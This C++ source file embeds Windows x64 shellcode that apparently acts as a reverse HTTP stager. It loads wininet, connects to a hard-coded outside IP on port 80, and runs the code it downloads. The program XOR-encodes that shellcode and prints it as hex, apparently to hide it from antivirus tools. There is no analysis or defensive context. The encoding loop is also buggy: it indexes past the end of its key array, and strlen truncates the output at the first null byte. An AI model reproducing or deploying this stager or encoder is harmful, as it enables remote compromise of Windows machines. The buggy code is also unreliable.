#include <string.h>
#include <iostream>

const int BUFLEN = 1738;

int key[64u] = { 0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f };

int main(int argc, char** argv)
{
	//if (argc != 3) return 0;
	
	char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\
		\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\
		\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\
		\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\
		\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\
		\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\
		\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\
		\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\
		\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\
		\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\
		\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\
		\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x6e\x62\
		\x49\x44\x00\xc2\x30\x9c\xe0\xf5\x63\xb0\x93\xba\x5c\xa1\x98\xf3\x24\x22\xf1\x93\xf4\x9e\xdd\x10\x17\xe9\x21\xb9\x40\xdc\x47\xb5\xaf\
		\x5b\x87\xa1\x54\xdf\x96\x5e\x12\xc1\x80\x2c\xeb\xae\xd0\x9e\xa5\x32\x4e\x97\x30\xb8\x09\x7a\xbf\x51\x05\x76\x12\x85\xd6\x15\xdf\xd6\
		\x3e\xdc\x85\x98\x13\xee\x45\x7f\xc6\x87\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\
		\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\
		\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\
		\x20\x4d\x44\x44\x43\x4a\x53\x29\x0d\x0a\x00\x95\x36\x5e\xe4\x40\xbc\xfc\xdc\x9a\x52\x00\x14\xe0\xf3\xc0\xe1\x7f\xeb\x12\x93\xf1\x19\
		\xa5\x8d\xca\x3a\x7c\xea\x36\xd3\x2b\x7c\x91\x71\x85\x26\x35\x12\xca\xf0\x53\xa5\x39\x62\x33\xef\xe6\xf8\x27\xa9\x64\x6b\xdf\x33\x73\
		\x55\x93\x31\x4e\x2f\x47\x94\x57\x86\xd4\x9d\x52\x78\x6c\xda\x6c\xe7\x43\x9a\x4e\x04\x7f\x81\x22\xfe\xdc\xdb\x5f\xd6\xba\x04\x23\xc0\
		\x67\xa7\x61\x9b\xc4\xd9\x9a\x3f\x81\x5c\xfa\xce\xe5\xb3\xfe\x73\x89\x68\x31\x4d\xe8\x95\x15\x1a\xed\xfe\xce\x66\x3a\x2d\xc2\x7e\xf0\
		\x39\x11\x99\xb5\x6d\x09\xb0\xa9\x4b\x01\x40\x89\xcb\xe4\x4d\x78\x81\xfb\xb8\x3e\x81\xb2\xb2\x28\x5a\x74\xbe\x31\xfd\x9a\x86\x02\xd4\
		\x0f\xca\xd0\x76\xd8\x74\x1c\xbb\xd5\x55\x43\x01\xd2\x8c\x56\xb1\x5d\xf4\x1d\xf6\x13\x29\xd6\x0e\xcd\xa9\xe2\x8f\x0a\x93\x46\xd0\xfe\
		\x4d\x20\x25\x12\x76\xa9\xdd\xd7\xb1\x18\xdf\x89\x16\x8a\xf7\x7a\xa7\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\
		\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\
		\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\
		\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x38\x37\x2e\x31\x30\x32\x2e\x31\x30\x35\x2e\x32\x31\x30\x00\x19\x69\xa0\x8d";
	
	char* output = new char[BUFLEN];

	for (int i = 0; i < BUFLEN; i++)
		output[i] = buf[i] ^ key[i % (sizeof(key) / sizeof(char))];

	for (size_t i = 0; i < strlen(output); i++)
	{
		printf("\\x%x", output[i] & 0xff); 
	}
	system("pause");
	return 0;
}